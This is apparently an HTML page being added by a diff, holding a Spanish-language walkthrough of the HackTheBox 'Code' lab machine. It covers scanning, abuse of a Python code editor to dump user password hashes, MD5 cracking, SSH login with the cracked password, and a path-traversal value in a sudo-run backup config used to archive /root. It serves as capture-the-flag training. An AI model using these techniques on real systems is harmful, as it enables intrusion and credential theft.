@@ -1,0 +1,336 @@
+
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Walkthrough Code</title>
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #00e81f;
+      font-family: 'Fira Code', monospace;
+      padding: 30px;
+    }
+
+    h1 {
+      color: #ff004f;
+      font-size: 2.5em;
+      border-bottom: 2px solid #1f6feb;
+      padding-bottom: 10px;
+    }
+
+    .meta {
+      margin-top: 10px;
+      color: #00ff91;
+      font-size: 0.9em;
+    }
+
+    .username {
+      color: #1f6feb;
+    }
+
+    h2 {
+      color: #ffa500;
+      border-bottom: 1px solid #1f6feb;
+      padding-bottom: 5px;
+    }
+
+    pre {
+      background-color: #161b22;
+      color: #f0f6fc;
+      padding: 15px;
+      border-radius: 10px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+
+    a {
+      color: magenta;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .table-of-contents {
+      margin-top: 30px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <h1>Hackthebox >> Code</h1>
+
+  <div class="table-of-contents">
+    <h2>▶ Tabla de Contenidos</h2>
+    <ul>
+      <li><a href="#info">🔍 Información de la máquina</a></li>
+      <li><a href="#nmap">🔎 Escaneo con Nmap</a></li>
+      <li><a href="#web">🌐 Enumeración Web</a></li>
+      <li><a href="#wp">🔓 Cracking de hashes de contraseñas</a></li>
+      <li><a href="#hashes">👤 Acceso como usuario</a></li>
+      <li><a href="#user">🌚 Obtencion de la bandera usuario</a></li>
+      <li><a href="#privesc">👹 Escalada de privilegios</a></li>
+    </ul>
+  </div>
+
+  <h2 id="info">🔍 Información de la máquina</h2>
+  <p>La máquina Code se centra en una aplicación web basada en Python que incluye un editor de código en línea. Esta configuración introduce desafíos relacionados con entornos de ejecución restringidos (sandboxes) y técnicas para evadir estas restricciones. Además, se exploran conceptos de escalada de privilegios mediante la explotación de configuraciones incorrectas del sistema.</p>
+
+  <h2 id="nmap">🔎 Escaneo con Nmap</h2>
+  <pre># nmap -sC -sV -T5 10.10.11.62
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 19:32 AST
+Warning: 10.10.11.62 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.62
+Host is up (0.076s latency).
+Not shown: 987 closed tcp ports (reset)
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+1058/tcp  filtered nim
+3031/tcp  filtered eppc
+5000/tcp  open     http          Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Python Code Editor
+6112/tcp  filtered dtspc
+6699/tcp  filtered napster
+7001/tcp  filtered afs3-callback
+7937/tcp  filtered nsrexecd
+20000/tcp filtered dnp
+32782/tcp filtered unknown
+49176/tcp filtered unknown
+60020/tcp filtered unknown
+64623/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+<p>El primer paso fue realizar un escaneo con nmap -sC -sV -T5 para identificar servicios activos y versiones. La máquina respondió en el puerto 22 con un servicio OpenSSH 8.2p1, y en el puerto 5000 con un servidor Gunicorn 20.0.4, que sirve una aplicación web titulada Python Code Editor.</p>
+<p>Llamó la atención que varios puertos estaban en estado filtered, lo cual sugiere que podrían estar protegidos por un firewall o filtrados por reglas específicas del host. Esto limitó el reconocimiento, pero el servicio en el puerto 5000 se convirtió en el foco principal para continuar la enumeración y búsqueda de vectores de ataque.</p>
+
+<h2 id="web">🌐 Enumeración Web</h2>
+<pre># gobuster dir -u http://10.10.11.62:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.62:5000/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 818]
+/login                (Status: 200) [Size: 730]
+/register             (Status: 200) [Size: 741]
+/logout               (Status: 302) [Size: 189] [--> /]
+/codes                (Status: 302) [Size: 199] [--> /login]
+</pre>
+<p>El escaneo reveló varias rutas interesantes podemos encontrar que 2 puertos están escuchando, vamos a revisar 10.10.11.62:5000.:</p>
+<pre>
+  <img src="IMG/code1.png">
+</pre>
+<p>Al acceder a la aplicación web en el puerto 5000, se presenta un entorno interactivo de ejecución de código Python en tiempo real. El entorno permite escribir código en un editor del lado izquierdo, y al hacer clic en el botón "Run", los resultados se imprimen en el área derecha.</p>
+<p>⚠️ Esto representa una superficie de ataque crítica, ya que si el servidor no implementa un entorno seguro y aislado (sandboxing) para ejecutar el código, podría ser vulnerable a Remote Code Execution (RCE).</p>
+
+<pre>
+  <img src="IMG/code2.png">
+</pre>
+<p>Mediante la ejecución del siguiente código en el entorno de ejecución vulnerable:</p>
+<pre>print([(user.id, user.username, user.password) for user in User.query.all()])</pre>
+<p>Se logró obtener una lista completa de usuarios registrados en la base de datos, incluyendo sus nombres de usuario y hashes de contraseñas:</p>
+<pre>[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'),
+ (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
+</pre>
+<ul><li>Se confirma que el entorno de ejecución tiene acceso directo al modelo de datos y puede interactuar con el ORM (probablemente SQLAlchemy).</li></ul>
+<ul><li>Las contraseñas no están en texto plano, pero los hashes pueden ser sometidos a ataques de fuerza bruta o cracking con herramientas como John the Ripper o Hashcat.</li></ul>
+
+<h2 id="wp">🔓 Cracking de hashes de contraseñas</h2>
+<pre># john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt user.hash
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+development      (?)     
+nafeelswordsmaster (?)     
+2g 0:00:00:00 DONE (2025-05-19 21:49) 2.469g/s 6453Kp/s 6453Kc/s 6703KC/s nafi1993..naerox
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</pre>
+<p>Una vez obtenidos los hashes desde la base de datos, fueron guardados en un archivo llamado user.hash con el siguiente contenido:</p>
+<pre>759b74ce43947f5f4c91aeddc3e5bad3
+3de6f30c4a09c27fc71932bfc68474be
+</pre>
+<p>Se utilizó John the Ripper junto a la famosa wordlist rockyou.txt para realizar el cracking de los hashes con el siguiente comando:</p>
+<pre>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt user.hash</pre>
+<p>Resultados:</p>
+<pre>development : development
+martin      : nafeelswordsmaster
+</pre>
+
+<h2 id="hashes">👤 Acceso como usuario</h2>
+<pre># ssh martin@10.10.11.62
+The authenticity of host '10.10.11.62 (10.10.11.62)' can't be established.
+ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
+martin@10.10.11.62's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 20 May 2025 01:53:27 AM UTC
+
+  System load:  0.01              Processes:             250
+  Usage of /:   54.6% of 5.33GB   Users logged in:       2
+  Memory usage: 20%               IPv4 address for eth0: 10.10.11.62
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue May 20 01:53:28 2025 from 10.10.14.137
+martin@code:~$ 
+</pre>
+<p>Accedemos con acceso remoto vía SSH al servidor 10.10.11.62 como el usuario martin con la contraseña nafeelswordsmaster.</p>
+
+<pre>martin@code:~$ sudo -l
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+</pre>
+<p>Ejecutamos sudo -l para listar qué comandos puede ejecutar el usuario martin con sudo sin pedir contraseña.</p>
+<p>La salida nos indica que martin puede ejecutar sin restricciones el script /usr/bin/backy.sh usando sudo, sin necesidad de introducir su contraseña.</p>
+
+<pre>martin@code:~/backups$ cat task.json
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/app-production/app"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}
+</pre>
+<p>Este archivo JSON especifica la configuración de un script o aplicación que probablemente genera backups comprimidos de ciertos directorios.</p>
+
+<h2 id="user">🌚 Obtencion de la bandera usuario</h2>
+<pre>martin@code:~/backups$ nano task.json 
+
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/app-production/user.txt"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}</pre>
+<p>Cambiemos la task.json para obtener user.txt</p>
+
+<pre>martin@code:~/backups$ sudo /usr/bin/backy.sh ./task.json
+2025/05/20 02:10:30 🍀 backy 1.2
+2025/05/20 02:10:30 📋 Working with ./task.json ...
+2025/05/20 02:10:30 💤 Nothing to sync
+2025/05/20 02:10:30 📤 Archiving: [/home/app-production/user.txt]
+2025/05/20 02:10:30 📥 To: /home/martin/backups ...
+2025/05/20 02:10:30 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_app-production_usert.txt_2025_May.tar.bz2  task.json
+martin@code:~/backups$ 
+</pre>
+<p>Ejecutamos el script /usr/bin/backy.sh usando sudo con el archivo de configuración task.json como argumento.</p>
+<p>El script indica que no hay archivos nuevos para sincronizar ("Nothing to sync"), pero procede a crear un archivo de respaldo (backup) de la carpeta /home/app-production/app.</p>
+<p>El archivo generado se guarda en /home/martin/backups con un nombre que incluye la fecha y el origen del backup (code_home_app-production_user.txt_2025_May.tar.bz2).</p>
+
+<pre>martin@code:~/backups$ tar -xjf ./code_home_app-production_user.txt_2025_May.tar.bz2
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2    home
+code_home_app-production_user.txt_2025_May.tar.bz2  task.json
+martin@code:~/backups$ cd home
+martin@code:~/backups/home$ ls
+app-production
+martin@code:~/backups/home$ cd app-production
+martin@code:~/backups/home/app-production$ ls
+user.txt
+</pre>
+<p>Ejecutamos el comando tar -xjf para descomprimir el archivo code_home_app-production_user.txt_2025_May.tar.bz2, que contiene un respaldo comprimido.
+Al listar el directorio después de la extracción, aparece una nueva carpeta llamada home.</p>
+<p>Ingresamos a home y luego a la subcarpeta app-production, dentro de esta carpeta, encontramos el archivo user.txt.</p>
+
+<h2 id="privesc">👹 Escalada de privilegios</h2>
+<pre>martin@code:~$ nano task.json 
+martin@code:~$ cat task.json 
+{
+        "destination": "/home/martin/",
+        "multiprocessing": true,
+        "verbose_log": true,
+        "directories_to_archive": [
+                "/home/....//root/"
+        ]
+}
+</pre>
+<p>Cambiemos la task.json para obtener el root.txt</p>
+
+<pre>martin@code:~/backups$ sudo /usr/bin/backy.sh ./task.json
+2025/05/20 02:53:46 🍀 backy 1.2
+2025/05/20 02:53:46 📋 Working with ./task.json ...
+2025/05/20 02:53:46 💤 Nothing to sync
+2025/05/20 02:53:46 📤 Archiving: [/home/../root]
+2025/05/20 02:53:46 📥 To: /home/martin/backups ...
+2025/05/20 02:53:46 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_home_.._root_2025_May.tar.bz2
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  root  task.json
+martin@code:~/backups$ cd root
+martin@code:~/backups/root$ ls
+root.txt  scripts
+</pre>
+<p>Volvemos a ejecutar el script backy.sh con sudo usando el archivo task.json modificado, que ahora incluye la ruta para archivar /root.</p>
+<p>Extraemos el contenido del backup con tar -xjf. Esto crea un nuevo directorio llamado root con el contenido del backup.</p>
+<p>Dentro del directorio root, encontramos archivo root.txt, para asi finalizar la maquina.</p>
+
+  
+  </body>
+</html>
